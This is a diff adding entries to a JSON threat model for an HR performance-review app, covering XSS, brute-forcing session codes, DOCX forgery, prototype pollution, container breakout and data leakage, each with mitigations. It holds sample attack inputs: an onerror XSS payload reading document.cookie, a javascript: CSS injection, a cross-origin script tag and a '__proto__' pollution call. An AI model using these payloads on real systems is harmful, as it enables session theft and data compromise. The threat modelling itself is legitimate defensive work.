+    "mitigation": "Implement comprehensive audit logging to Phase 2/3 database with write-once tables. Log all CRUD operations with user identity, timestamp, IP address, and changed fields. Implement digital signatures on reviews using manager's cryptographic identity. Add blockchain or append-only log for immutable audit trail."
+  },
+  {
+    "id": "THREAT-006",
+    "category": "Information Disclosure",
+    "title": "Voice Recording Data Leakage During Transmission",
+    "description": "Audio recordings containing sensitive performance feedback are transmitted to the Whisper server endpoint without encryption in development mode (HTTP). Even in production with HTTPS, the audio contains highly sensitive conversations that could be intercepted if TLS is compromised or if internal network traffic is monitored.",
+    "severity": "medium",
+    "affected_components": [
+      "useWhisper.js",
+      "whisper_server_faster.py",
+      "Caddy proxy"
+    ],
+    "attack_scenario": "Manager uses voice input to dictate: 'John has serious performance issues and may be terminated if no improvement by Q2'. In development mode, this audio is sent over HTTP to localhost:3001. An attacker on the same network (coffee shop WiFi, corporate network) captures the unencrypted audio file via Wireshark and can replay the sensitive conversation. Even with HTTPS, if the attacker has compromised the internal Docker network, they can intercept traffic between Caddy and Whisper service.",
+    "vulnerability_types": [
+      "CWE-319",
+      "CWE-311"
+    ],
+    "mitigation": "Enforce HTTPS even in development using self-signed certificates. Implement end-to-end encryption for audio data before transmission (encrypt in browser, decrypt in Whisper server). Add network segmentation to isolate Whisper container. Implement TLS mutual authentication between Caddy and Whisper service."
+  },
+  {
+    "id": "THREAT-007",
+    "category": "Elevation of Privilege",
+    "title": "No Role-Based Access Control - Any User Can Review Any Employee",
+    "description": "Phase 1 has no authentication or authorization. Anyone with access to the application URL can create performance reviews for any employee, including executives or HR personnel. No validation exists to ensure the person conducting the review is the employee's actual manager or authorized reviewer.",
+    "severity": "critical",
+    "affected_components": [
+      "All components",
+      "Phase 1 architecture"
+    ],
+    "attack_scenario": "Disgruntled employee discovers the performance review application URL. They create a fake review for their manager with poor scores and fabricated negative comments, generate a DOCX report, and submit it to HR claiming it's their manager's actual review. HR cannot verify authenticity since no authentication exists. Alternatively, attacker creates fake positive reviews for themselves to support promotion requests.",
+    "vulnerability_types": [
+      "CWE-862",
+      "CWE-863",
+      "CWE-306"
+    ],
+    "mitigation": "Immediately implement Phase 2/3 authentication using Keycloak. Enforce role-based access control where only assigned managers can review their direct reports. Add digital signatures to prove review authenticity. Implement manager-employee relationship validation before allowing review creation."
+  },
+  {
+    "id": "THREAT-008",
+    "category": "Information Disclosure",
+    "title": "Sensitive Data Exposure via Browser History and Cache",
+    "description": "Employee names, roles, business units, and other sensitive information entered into the application may be cached by the browser's autocomplete feature, stored in browser history, or indexed by browser sync features. This data persists beyond the 14-day session expiry and can be recovered through browser forensics.",
+    "severity": "medium",
+    "affected_components": [
+      "EmployeeInfo.jsx",
+      "All form inputs",
+      "Browser cache"
+    ],
+    "attack_scenario": "Manager completes performance review on company laptop, then sells or returns the device. New user or IT technician accesses browser history and autocomplete data, recovering employee names and roles. They use browser forensics tools to extract cached form data revealing performance scores and comments from completed reviews. This violates employee privacy and GDPR data retention policies.",
+    "vulnerability_types": [
+      "CWE-524",
+      "CWE-200"
+    ],
+    "mitigation": "Add autocomplete='off' attributes to all sensitive form fields. Implement Cache-Control headers (no-cache, no-store, must-revalidate). Add prominent warning to users about clearing browser data after use. Implement session expiry with automatic data purge. Use SameSite=Strict cookies in Phase 2/3."
+  },
+  {
+    "id": "THREAT-009",
+    "category": "Spoofing",
+    "title": "DOCX Report Forgery with No Digital Signature",
+    "description": "Generated DOCX reports contain only a plaintext session code in the footer. No digital signature, watermark, or cryptographic proof of authenticity exists. Attackers can easily forge reports by manually editing the DOCX XML files or using document editing software, making fake reviews indistinguishable from authentic ones.",
+    "severity": "high",
+    "affected_components": [
+      "docxGenerator.js",
+      "docx library"
+    ],
+    "attack_scenario": "Attacker downloads a legitimate performance review DOCX, unzips it (DOCX is XML), and edits document.xml to change scores from 1s to 3s, modify comments to be glowing praise, and change the employee name. They re-zip the file, maintaining valid DOCX structure. When submitted to HR, the forged review appears completely legitimate with no way to verify authenticity or detect tampering.",
+    "vulnerability_types": [
+      "CWE-345",
+      "CWE-347"
+    ],
+    "mitigation": "Implement digital signatures on DOCX files using XML-DSig standard. Add QR codes containing cryptographic hashes linking to server-side verification. Embed invisible watermarks with timestamp and manager identity. In Phase 2/3, implement server-side report generation with cryptographic proofs and tamper-evident seals."
+  },
+  {
+    "id": "THREAT-010",
+    "category": "Tampering",
+    "title": "Client-Side XSS Despite Input Sanitization",
+    "description": "While HTML entity encoding is implemented (sanitizeInput function), it only escapes basic characters. Sophisticated XSS payloads using Unicode characters, encoded entities, or context-specific attacks (CSS injection, JavaScript protocol handlers) could bypass sanitization. The sanitization happens only before saving to localStorage, not during rendering, creating potential for double-encoding vulnerabilities.",
+    "severity": "medium",
+    "affected_components": [
+      "session.js sanitizeInput()",
+      "FormContext sanitizeFormData()",
+      "All form input components"
+    ],
+    "attack_scenario": "Attacker discovers sanitization bypass using encoded payload: employee name set to '<img src=x onerror=alert(document.cookie)>' which gets entity-encoded to storage but improperly decoded during render. Or uses CSS injection in goal description: 'background-url: url(javascript:fetch(...))' that executes in specific contexts. XSS payload exfiltrates all localStorage data including all saved performance reviews.",
+    "vulnerability_types": [
+      "CWE-79",
+      "CWE-116"
+    ],
+    "mitigation": "Implement Content Security Policy headers (currently commented out in Caddyfile). Use React's built-in XSS protection consistently (avoid dangerouslySetInnerHTML). Implement DOMPurify library for robust HTML sanitization. Add input validation beyond sanitization (whitelist allowed characters). Implement proper output encoding context-aware for HTML, JS, CSS, URL contexts."
+  },
+  {
+    "id": "THREAT-011",
+    "category": "Denial of Service",
+    "title": "Browser Resource Exhaustion via Large Whisper Model Download",
+    "description": "The browser-based Whisper model (whisper-small is ~500MB, whisper-base is ~150MB) downloads on first use and is stored in IndexedDB. On slow networks or low-end devices, this can cause browser hangs, tab crashes, or device storage exhaustion. No user consent is obtained before downloading hundreds of megabytes.",
+    "severity": "low",
+    "affected_components": [
+      "WhisperContext.jsx",
+      "useBrowserWhisper.js",
+      "@huggingface/transformers"
+    ],
+    "attack_scenario": "User on mobile device with limited data plan clicks voice input button. Application automatically starts downloading 500MB Whisper model without warning. User exhausts monthly data allowance incurring overage charges. On low-end device, the model download fills available storage causing device malfunction. Browser tab becomes unresponsive during model loading, user force-quits and loses unsaved review data.",
+    "vulnerability_types": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "mitigation": "Add explicit user consent before downloading large models with size and data usage warnings. Implement progress indicators with cancel option. Set storage quotas using Storage API and check available space before download. Prioritize smaller whisper-tiny model for mobile. Add fallback to server-based transcription if browser model fails."
+  },
+  {
+    "id": "THREAT-012",
+    "category": "Information Disclosure",
+    "title": "Session Code Enumeration via Brute Force",
+    "description": "Session codes are only 10 alphanumeric characters (case-insensitive) yielding 36^10 ≈ 3.6 quadrillion combinations. While large, the lack of rate limiting on session resume attempts allows brute force attacks. No account lockout or exponential backoff exists. Successful guesses grant full access to sensitive performance data.",
+    "severity": "medium",
+    "affected_components": [
+      "session.js loadSession()",
+      "FormContext resumeSession()",
+      "SessionsList.jsx"
+    ],
+    "attack_scenario": "Attacker writes automated script to attempt resuming sessions with incrementing codes (AAAAAAAAAA, AAAAAAAAAB, etc.). Script runs continuously checking for successful loads. localStorage provides instant feedback (no network roundtrip needed). Over weeks, attacker discovers valid session codes and accesses multiple employees' performance reviews. No logging alerts administrators to enumeration attempts.",
+    "vulnerability_types": [
+      "CWE-307",
+      "CWE-798"
+    ],
+    "mitigation": "Increase session code entropy to 16+ characters with mixed case and special characters. Implement rate limiting even for client-side operations using Web Storage API timestamps. Add CAPTCHA after N failed resume attempts. Migrate to Phase 2/3 with server-side session validation and brute force protection. Implement account lockout after repeated failures."
+  },
+  {
+    "id": "THREAT-013",
+    "category": "Information Disclosure",
+    "title": "Whisper Model Download from Untrusted CDN",
+    "description": "The browser-based Whisper models are downloaded from Hugging Face CDN (huggingface.co) without subresource integrity (SRI) verification. A compromised CDN or man-in-the-middle attacker could serve malicious JavaScript disguised as the Whisper model, executing arbitrary code in the application context with access to all performance review data.",
+    "severity": "medium",
+    "affected_components": [
+      "@huggingface/transformers",
+      "WhisperContext.jsx",
+      "Browser model loading"
+    ],
+    "attack_scenario": "Attacker compromises Hugging Face CDN or performs DNS poisoning to redirect model downloads to malicious server. When manager clicks voice input button, browser downloads trojanized Whisper model containing JavaScript payload. Payload executes in application context, reads all localStorage data, and exfiltrates performance reviews to attacker's server. User sees normal transcription functionality while data is stolen in background.",
+    "vulnerability_types": [
+      "CWE-494",
+      "CWE-829"
+    ],
+    "mitigation": "Implement Subresource Integrity (SRI) checks for all external model downloads. Enable Content Security Policy with strict script-src directives. Self-host Whisper models on trusted infrastructure. Implement model signature verification before loading. Add network security monitoring to detect anomalous CDN connections."
+  },
+  {
+    "id": "THREAT-014",
+    "category": "Tampering",
+    "title": "Weight Manipulation to Inflate Performance Scores",
+    "description": "The application validates that goal weights sum to 100%, but users can assign 99% weight to high-scoring goals and 1% to low-scoring goals, artificially inflating the overall WHAT score. No business rules enforce balanced weight distribution or flag suspicious weighting patterns.",
+    "severity": "low",
+    "affected_components": [
+      "WhatAxis.jsx",
+      "scoring.js calculateWhatScore()",
+      "FormContext"
+    ],
+    "attack_scenario": "Manager creates 5 goals for an underperforming employee. They assign 98% weight to one easy goal that scored 3, and 0.5% weight each to four critical goals that scored 1. The weighted WHAT score calculates to 2.96 (near perfect), even though 4 out of 5 goals failed. Generated report shows employee in green zone despite poor actual performance. Senior management questions the obvious gaming of the system.",
+    "vulnerability_types": [
+      "CWE-840",
+      "CWE-1021"
+    ],
+    "mitigation": "Implement business rules enforcing balanced weights (e.g., no single goal > 50% weight, minimum weight per goal 5%). Add warnings in UI and DOCX report when weight distribution is unbalanced. Flag reviews with suspicious patterns for HR review. In Phase 2/3, implement approval workflows requiring justification for unbalanced weights."
+  },
+  {
+    "id": "THREAT-015",
+    "category": "Repudiation",
+    "title": "No Proof of Employee Acknowledgment of Review",
+    "description": "The application has no mechanism for employees to acknowledge they have read and understood their performance review. No digital signature or timestamp proves the employee was informed of their assessment. Employees can later claim they never saw negative feedback or were not informed of performance issues.",
+    "severity": "medium",
+    "affected_components": [
+      "SelfAssessment.jsx",
+      "docxGenerator.js",
+      "Actions.jsx"
+    ],
+    "attack_scenario": "Manager completes performance review showing employee needs improvement, downloads DOCX, and emails it. Employee claims months later during termination proceedings that they never received the review and were not warned about performance issues. No technical evidence exists showing employee receipt, review, or acknowledgment. Company faces wrongful termination lawsuit with no proof of proper performance management process.",
+    "vulnerability_types": [
+      "CWE-778",
+      "CWE-357"
+    ],
+    "mitigation": "Implement employee acknowledgment workflow where employee must click 'I have reviewed this' button with date/time stamp. Add digital signature collection for both manager and employee. Implement email delivery tracking and read receipts. In Phase 2/3, require both parties to authenticate and sign review before finalization. Create non-repudiable audit trail in database."
+  },
+  {
+    "id": "THREAT-016",
+    "category": "Elevation of Privilege",
+    "title": "Malicious Browser Extension with localStorage Access",
+    "description": "Browser extensions with broad 'storage' permissions can access localStorage data from any website. A malicious extension marketed as productivity tool or ad blocker could specifically target HR applications, stealing all performance review data from users who install it. Users unaware of extension permissions grant unfettered access.",
+    "severity": "medium",
+    "affected_components": [
+      "localStorage",
+      "Browser security model",
+      "All stored session data"
+    ],
+    "attack_scenario": "Attacker publishes browser extension 'PDF Export Helper' marketed to HR professionals. Extension requests storage permissions (common for legitimate extensions). Once installed, extension runs background script that monitors localStorage for 'hr_performance_sessions' key. When detected, extension exfiltrates all review data to attacker's server. Hundreds of managers install extension, leaking entire organization's performance data.",
+    "vulnerability_types": [
+      "CWE-250",
+      "CWE-269"
+    ],
+    "mitigation": "Migrate to Phase 2/3 architecture eliminating localStorage for sensitive data. Implement server-side encryption where client never sees plaintext sensitive data. Add Content Security Policy headers blocking unauthorized script execution. Educate users about extension risks. Implement browser extension blocklists at organizational level. Use memory-only storage for sensitive data when possible."
+  },
+  {
+    "id": "THREAT-017",
+    "category": "Denial of Service",
+    "title": "localStorage Quota Exhaustion Attack",
+    "description": "Browsers typically limit localStorage to 5-10MB per origin. An attacker could exhaust this quota by creating hundreds of fake sessions with maximum-length text in all fields, preventing legitimate users from saving their work. No quota monitoring or garbage collection exists beyond the 14-day expiry.",
+    "severity": "low",
+    "affected_components": [
+      "session.js",
+      "FormContext",
+      "localStorage"
+    ],
+    "attack_scenario": "Attacker accesses application on shared kiosk computer or compromises user's browser. They execute script creating 50 performance reviews with all text fields filled to maximum length (thousands of characters each). localStorage reaches 10MB quota limit. Next legitimate user tries to save their review but gets QuotaExceededError. Auto-save silently fails, user loses hours of work when browser crashes or tab closes. No error message warns user of storage failure.",
+    "vulnerability_types": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "mitigation": "Implement quota checking before saves with user warnings when approaching limit. Add storage usage indicator in UI. Implement aggressive garbage collection of expired sessions before creating new ones. Add manual 'Clear Old Sessions' button. Implement storage compression for JSON data. Migrate to Phase 2/3 server storage eliminating browser quota limits."
+  },
+  {
+    "id": "THREAT-018",
+    "category": "Information Disclosure",
+    "title": "Competency Definitions Reveal Organizational Structure",
+    "description": "The competencies.js file hardcoded in the application reveals the complete organizational hierarchy structure (TOV-levels A/B/C/D) and expected capabilities for each level. This information could be valuable for competitive intelligence, social engineering attacks, or targeted phishing campaigns aimed at specific organizational levels.",
+    "severity": "low",
+    "affected_components": [
+      "competencies.js",
+      "HowAxis.jsx",
+      "levelDescriptions"
+    ],
+    "attack_scenario": "Competitor or malicious actor accesses the application and examines browser DevTools. They view competencies.js revealing that Level A requires 'Operational Excellence' and 'Change Management' skills, while Level D requires 'Strategic Leadership' and 'Business Acumen'. Attacker uses this to craft targeted LinkedIn phishing: 'As a Strategic Leader at TSS, you're invited...' specifically targeting D-level employees. Social engineering attack success rate increases significantly.",
+    "vulnerability_types": [
+      "CWE-200",
+      "CWE-359"
+    ],
+    "mitigation": "Move competency definitions to server-side in Phase 2/3 with role-based access. Obfuscate or encrypt competency data in JavaScript bundles. Implement API authentication before serving competency frameworks. Consider if competency definitions need to be secret or can be public (may not be high risk). Add honeypot fake competencies to detect scraping."
+  },
+  {
+    "id": "THREAT-019",
+    "category": "Tampering",
+    "title": "Session Data Corruption via Concurrent Browser Tabs",
+    "description": "If a user opens the same session in multiple browser tabs simultaneously, concurrent modifications to localStorage create race conditions. The last tab to save overwrites changes from other tabs, causing data loss. The auto-save mechanism (2.5 second delay) exacerbates this with unpredictable save ordering.",
+    "severity": "medium",
+    "affected_components": [
+      "FormContext",
+      "session.js saveSession()",
+      "Auto-save mechanism"
+    ],
+    "attack_scenario": "Manager opens performance review in two browser tabs to compare with last year's review document. They make edits in Tab A (update goals), then switch to Tab B and make different edits (update competencies). Auto-save in Tab B triggers after Tab A, overwriting the goal changes. Manager clicks 'Download Report' and discovers half their edits are missing. No conflict detection or merge mechanism exists. User frustration and data integrity issues.",
+    "vulnerability_types": [
+      "CWE-362",
+      "CWE-662"
+    ],
+    "mitigation": "Implement browser tab synchronization using StorageEvent listeners to detect concurrent edits. Add conflict detection comparing timestamps before saves. Show warning modal: 'This session is open in another tab - changes may conflict'. Implement last-write-wins with version numbers. Migrate to Phase 2/3 with server-side concurrency control and optimistic locking."
+  },
+  {
+    "id": "THREAT-020",
+    "category": "Information Disclosure",
+    "title": "Temporary Audio Files Persist in Docker Volume",
+    "description": "While the Whisper server attempts to delete temporary audio files in the finally block, errors during cleanup could leave files persisted. If the /app/uploads/ directory is mapped to a Docker volume for debugging, audio recordings containing sensitive performance discussions could accumulate over time.",
+    "severity": "low",
+    "affected_components": [
+      "whisper_server_faster.py",
+      "Docker whisper container",
+      "Temporary file handling"
+    ],
+    "attack_scenario": "Whisper server crashes mid-processing due to OOM error before reaching the finally block. Temporary audio file containing manager discussing 'John's serious alcohol problem affecting work' remains in /app/uploads/. If volume is mapped for debugging or logging purposes, sensitive audio persists beyond intended lifecycle. Container restart or system backup includes these files. Later forensic analysis or backup restoration exposes sensitive conversations.",
+    "vulnerability_types": [
+      "CWE-459",
+      "CWE-212"
+    ],
+    "mitigation": "Implement guaranteed cleanup using context managers (with statements) for all temporary files. Add startup script that cleans /app/uploads/ directory on container start. Mount /app/uploads/ as tmpfs (memory-only filesystem) so files never persist to disk. Implement audio file encryption before writing to temp storage. Add monitoring alerts for unexpected files in temp directories."
+  },
+  {
+    "id": "THREAT-021",
+    "category": "Spoofing",
+    "title": "Whisper Server Impersonation Attack",
+    "description": "In development mode, the frontend connects to http://localhost:3001 for transcription. An attacker running malicious software on the user's machine could bind to port 3001 first, impersonating the Whisper server. All voice recordings would be sent to the malicious service which returns fake transcriptions while stealing audio data.",
+    "severity": "medium",
+    "affected_components": [
+      "useWhisper.js SPEECH_SERVER_URL",
+      "Development environment",
+      "Whisper server connection"
+    ],
+    "attack_scenario": "Developer runs performance review application on development machine. Malware previously installed binds to localhost:3001 and implements fake /transcribe endpoint. When developer uses voice input, audio is sent to malicious local server. Fake server returns plausible transcriptions (using remote API) while logging all audio to attacker's command-and-control server. Developer unaware their dictation is being captured. Sensitive performance discussions exfiltrated.",
+    "vulnerability_types": [
+      "CWE-346",
+      "CWE-300"
+    ],
+    "mitigation": "Implement mutual TLS authentication even for localhost connections. Add server certificate pinning to verify Whisper server identity. Use random high-numbered ports instead of fixed 3001. Implement health check with cryptographic challenge-response before sending audio. Warn users if Whisper server certificate changes. In production, enforce HTTPS with valid certificates only."
+  },
+  {
+    "id": "THREAT-022",
+    "category": "Elevation of Privilege",
+    "title": "Docker Container Breakout via Whisper Server Vulnerabilities",
+    "description": "The Whisper server runs as root inside the container (Python containers typically default to root). If vulnerabilities exist in Flask, faster-whisper, or audio processing libraries (ffmpeg, librosa, soundfile), an attacker could exploit them to gain root access inside the container, then potentially escape to the host system.",
+    "severity": "medium",
+    "affected_components": [
+      "Dockerfile.whisper",
+      "whisper_server_faster.py",
+      "Docker container security"
+    ],
+    "attack_scenario": "Attacker discovers buffer overflow in librosa's audio file parsing. They craft malicious audio file that exploits vulnerability when uploaded to /transcribe endpoint. Exploit gains code execution as root inside Whisper container. Attacker then exploits Docker escape vulnerability (kernel exploit) to break out to host system. Full compromise of server infrastructure hosting performance review system. All data in PostgreSQL, Keycloak, and other containers exposed.",
+    "vulnerability_types": [
+      "CWE-250",
+      "CWE-269",
+      "CWE-732"
+    ],
+    "mitigation": "Run Whisper container as non-root user (add USER directive in Dockerfile). Implement read-only root filesystem with only /tmp writable. Enable Docker security features (AppArmor, SELinux, seccomp profiles). Remove unnecessary packages from container. Implement resource limits and cgroup constraints. Keep all dependencies updated with automated vulnerability scanning. Use distroless or minimal base images."
+  },
+  {
+    "id": "THREAT-023",
+    "category": "Tampering",
+    "title": "DOCX Metadata Exposes System Information",
+    "description": "Generated DOCX files contain metadata about the system that created them including application name, creator identity, file paths, and timestamps. This metadata could reveal information about the infrastructure, usernames, or internal systems that should remain confidential.",
+    "severity": "low",
+    "affected_components": [
+      "docxGenerator.js",
+      "docx library",
+      "Document metadata"
+    ],
+    "attack_scenario": "Manager generates performance review DOCX and sends to employee. Employee examines file properties revealing metadata: 'Created by: HR Performance App on Chrome/Windows 10, user: john.manager@company.com, full file path: C:\\Users\\john.manager\\AppData\\Local\\Temp\\'. Employee uses this information for social engineering: calls IT helpdesk claiming to be john.manager, knows exact system details for credibility. Gains access to manager's account or related systems.",
+    "vulnerability_types": [
+      "CWE-200",
+      "CWE-212"
+    ],
+    "mitigation": "Scrub all metadata from generated DOCX files using docx library options. Set generic creator like 'HR System' instead of specific application details. Remove file paths and local system information. Implement metadata sanitization library. Add privacy notice about metadata to users. In Phase 2/3, generate documents server-side with controlled metadata."
+  },
+  {
+    "id": "THREAT-024",
+    "category": "Denial of Service",
+    "title": "Auto-Save Storm During Rapid Input Changes",
+    "description": "The auto-save mechanism triggers after 2.5 seconds of inactivity. If a user makes rapid changes (typing quickly, using voice input with auto-append), each change restarts the timer and queues a save operation. With voice input appending text every few seconds, hundreds of pending saves could accumulate, consuming CPU and causing browser lag or crashes.",
+    "severity": "low",
+    "affected_components": [
+      "FormContext auto-save mechanism",
+      "useWhisper.js",
+      "Voice input handling"
+    ],
+    "attack_scenario": "Manager uses rapid voice input dictating long employee self-assessment. Each transcription result appends text triggering state update. Auto-save timer resets but previous saves still pending in queue. After 5 minutes of continuous dictation, 100+ save operations queued. Browser main thread blocked serializing JSON and writing to localStorage. UI becomes unresponsive, input lag increases to seconds. Browser 'Aw Snap' crash loses all unsaved work.",
+    "vulnerability_types": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "mitigation": "Implement debouncing instead of simple delay (cancel pending saves on new changes). Add maximum save operation queue length with warning. Use Web Workers for localStorage operations to avoid blocking UI thread. Implement request throttling limiting saves to max 1 per second. Add save status indicator showing 'Saving...' vs 'Saved' with queue length. Optimize JSON serialization for large data structures."
+  },
+  {
+    "id": "THREAT-025",
+    "category": "Information Disclosure",
+    "title": "Cross-Site Script Inclusion (XSSI) via JSONP-like Endpoints",
+    "description": "If the application serves JSON data via script tags or JSONP-like patterns (though not evident in current code), attackers could include these endpoints in malicious websites to steal data cross-origin. Even without explicit JSONP, certain JavaScript configurations could leak data.",
+    "severity": "low",
+    "affected_components": [
+      "Vite build configuration",
+      "Static asset serving",
+      "API endpoints (Phase 2/3)"
+    ],
+    "attack_scenario": "Attacker discovers that application serves configuration or session data as JavaScript includes. They create malicious website with <script src='https://hr-review.company.com/config.js'></script>. User authenticated to HR system visits attacker's site. Browser automatically includes authentication cookies in script request. Attacker's page can now access data returned by script, exfiltrating session information or configuration secrets across origins.",
+    "vulnerability_types": [
+      "CWE-352",
+      "CWE-346"
+    ],
+    "mitigation": "Never serve sensitive data as JavaScript includes. Implement proper CORS headers (already partially configured). Add X-Content-Type-Options: nosniff header (already present). Implement SameSite cookie attributes in Phase 2/3. Use JSON APIs with authentication instead of script includes. Add CSRF tokens for state-changing operations."
+  },
+  {
+    "id": "THREAT-026",
+    "category": "Tampering",
+    "title": "Prototype Pollution via User-Controlled Object Properties",
+    "description": "The application uses dynamic object property assignment in several places (competencyScores, competencyNotes, form data). If property names are not properly validated, an attacker could inject properties like '__proto__' or 'constructor' causing prototype pollution that affects all objects in the application.",
+    "severity": "medium",
+    "affected_components": [
+      "FormContext updateCompetencyScore()",
+      "FormContext updateCompetencyNote()",
+      "session.js object handling"
+    ],
+    "attack_scenario": "Attacker manipulates browser DevTools or intercepts form submission to set competency ID to '__proto__'. They execute: updateCompetencyScore('__proto__', 3). This pollutes Object.prototype adding 'score: 3' property to all objects in application. Other parts of code now see unexpected properties leading to logic errors, security checks bypassed, or code execution. Application behaves unpredictably, validation rules broken.",
+    "vulnerability_types": [
+      "CWE-1321",
+      "CWE-915"
+    ],
+    "mitigation": "Validate all object property names against whitelist before assignment. Use Object.create(null) for dictionaries to avoid prototype chain. Implement Object.freeze() on critical objects. Use Map instead of plain objects for dynamic properties. Add input validation rejecting property names starting with '__' or 'constructor'. Implement Content Security Policy preventing inline script execution."
+  },
+  {
+    "id": "THREAT-027",
+    "category": "Repudiation",
+    "title": "Manager Can Delete Sessions Without Trace",
+    "description": "The application allows managers to delete sessions using the 'Clear Session' functionality. No confirmation prompt exists, no backup is created, and no audit log records the deletion. A manager could create and complete a review, then delete it claiming it never existed or that they gave better feedback than they actually did.",
+    "severity": "medium",
+    "affected_components": [
+      "Actions.jsx",
+      "SessionsList.jsx",
+      "FormContext clearSession()",
+      "session.js deleteSession()"
+    ],
+    "attack_scenario": "Manager creates harsh performance review with multiple score-1 competencies and negative comments. After heated discussion with employee, manager regrets the harsh feedback. They click 'Clear Session' button, permanently deleting the review. Manager then creates new review with gentler feedback. Employee complains to HR about harsh treatment but no evidence exists. Manager denies giving harsh review. No recovery mechanism, no audit trail, no truth established.",
+    "vulnerability_types": [
+      "CWE-778",
+      "CWE-404"
+    ],
+    "mitigation": "Implement soft delete with recovery period (e.g., 30-day recycle bin). Add confirmation dialog: 'Are you sure? This will permanently delete this review.' Implement audit logging before deletion capturing full session data. In Phase 2/3, prevent deletion entirely - mark as 'void' with reason. Require HR approval for review deletion. Create automated backups of all sessions to server before allowing local deletion."
+  },
+  {
+    "id": "THREAT-028",
+    "category": "Information Disclosure",
+    "title": "Browser DevTools Exposes All Application State",
+    "description": "React DevTools browser extension allows inspection of entire application state including FormContext with all performance review data. Any user with DevTools installed (developers, power users, curious employees) can view state of their own or potentially others' reviews if shared session codes.",
+    "severity": "low",
+    "affected_components": [
+      "FormContext",
+      "React state management",
+      "Browser DevTools"
+    ],
+    "attack_scenario": "Employee receives performance review document from manager but wants to see if manager made any changes before finalizing. They get manager's session code (from email or observation), open application, resume session, then open React DevTools. They inspect FormContext seeing complete history of all edits including potentially deleted harsh comments or changed scores. Employee screenshots evidence of changes causing workplace conflict.",
+    "vulnerability_types": [
+      "CWE-200",
+      "CWE-497"
+    ],
+    "mitigation": "Detect React DevTools presence and show warning banner about data visibility. Implement state encryption even in memory using Web Crypto API. Obfuscate component and state names in production builds. In Phase 2/3, implement proper authorization so users can only view their own data. Add audit logging of all DevTools usage. Consider disabling DevTools in production builds (though this is difficult to enforce)."
   }
-}
+]
